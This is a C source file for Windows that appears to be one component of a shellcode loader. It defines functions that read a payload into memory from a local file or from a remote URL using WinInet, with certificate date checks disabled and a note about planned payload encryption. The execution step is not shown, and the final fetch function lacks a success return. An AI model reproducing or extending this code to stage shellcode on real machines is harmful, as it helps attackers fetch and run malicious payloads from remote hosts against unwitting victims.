#include <stdio.h>
#include <windows.h>
#include <WinInet.h>

#include "Common.h"

#pragma comment (lib, "WinInet.lib")


BOOL FileExists(IN LPCSTR lpPath)
{
	DWORD dwAttrib = GetFileAttributesA(lpPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsUrl(IN LPCSTR lpUrl)
{
	return (strncmp(lpUrl, "http://", 7) == 0 || strncmp(lpUrl, "https://", 8) == 0);
}

BOOL IsDll(IN LPCSTR lpPath)
{
	char* tmp = strrchr(lpPath, '.');
	if (tmp != NULL)
		return strncmp(tmp, ".dll", 4) == 0;

	return FALSE;
}

/* TODO: Payload Encryption
BOOL IsEncrypted(IN LPCSTR lpPath)
{
	char* tmp = strrchr(lpPath, '.');
	if (tmp != NULL)
		return strncmp(tmp, ".enc", 4) == 0;

	return FALSE;
}*/

BOOL ReadShellcodeFromFile(IN LPCSTR lpPath, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize)
{
	HANDLE hFile = NULL;
	DWORD FileSize = 0, bytesRead;
	PVOID Payload = NULL;

	if ((hFile = CreateFileA(lpPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		return ReportErrorWinAPI("CreateFileA");

	if ((FileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
		return ReportErrorWinAPI("GetFileSize");

	Payload = LocalAlloc(LPTR, FileSize);

	if (!ReadFile(hFile, Payload, FileSize, &bytesRead, NULL) || bytesRead != FileSize)
		return ReportErrorWinAPI("ReadFile");

	*pShellcode = Payload;
	*sShellcodeSize = (SIZE_T) FileSize;
	printf("[i] Read shellcode of size %d from %s to 0x%p\n", bytesRead, lpPath, *pShellcode);

	return TRUE;
}

BOOL ReadShellcodeFromURL(IN LPCSTR lpUrl, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize)
{
	HINTERNET	hInternet = NULL, hInternetFile = NULL;;
	DWORD		dwBytesRead = 0, dwTmpSize = 0;
	PVOID pBytes = NULL, pTmpBytes = NULL;

	if (!IsUrl(lpUrl))
	{
		printf("[!] Input %s is not URL!\n", lpUrl);
		return FALSE;
	}

	if ((hInternet = InternetOpenA(NULL, NULL, NULL, NULL, NULL)) == NULL)
		return ReportErrorWinAPI("InternetOpenA");

	if ((hInternetFile = InternetOpenUrlA(hInternet, lpUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL)) == NULL)
		return ReportErrorWinAPI("InternetOpenUrlA");

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = LocalAlloc(LPTR, 1024);

	while (TRUE)
	{

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead))
			return ReportErrorWinAPI("InternetReadFile");

		// Updating the size of the total buffer 
		dwTmpSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = LocalAlloc(LPTR, dwTmpSize);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = LocalReAlloc(pBytes, dwTmpSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		// Append the temp buffer to the end of the total buffer
		memcpy((ULONG_PTR)pBytes + dwTmpSize - dwBytesRead, pTmpBytes, dwBytesRead);

		// Clean up the temp buffer 
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	printf("[i] Read shellcode of size %d at 0x%p\n", dwTmpSize, pBytes);
	*pShellcode = pBytes;
	*sShellcodeSize = (SIZE_T) dwTmpSize;

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);

	return TRUE;
}

BOOL FetchShellcode(IN LPCSTR lpShellcodePath, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize)
{
	// Shellcode is a file on disk
	if (FileExists(lpShellcodePath))
	{
		if (!ReadShellcodeFromFile(lpShellcodePath, pShellcode, sShellcodeSize))
		{
			printf("[!] Could not read shellcode from file : %s\n", lpShellcodePath);
			return FALSE;
		}
	}

	// Shellcode is URL
	else if (IsUrl(lpShellcodePath))
	{
		if (!ReadShellcodeFromURL(lpShellcodePath, pShellcode, sShellcodeSize))
		{
			printf("[!] Could not read shellcode from URL : %s\n", lpShellcodePath);
			return FALSE;
		}
	}

	// Wrong Input
	else
	{
		printf("[!] Unknown input : %s!\n", lpShellcodePath);
		return FALSE;
	}
}